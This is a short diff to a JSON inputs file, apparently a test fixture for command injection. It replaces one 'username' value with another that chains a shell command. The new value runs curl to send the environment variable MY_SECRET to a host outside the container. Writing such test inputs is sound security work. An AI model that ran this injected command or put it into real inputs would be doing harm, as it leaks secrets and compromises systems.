@@ -1,6 +1,5 @@
 {
-    "inputs": {
-      "username": "normaluser && curl http://localhost:8000/pwned"
-    }
+  "inputs": {
+    "username": "echo hacked && curl http://host.docker.internal:8000/leak?secret=$MY_SECRET"
   }
-  
+}
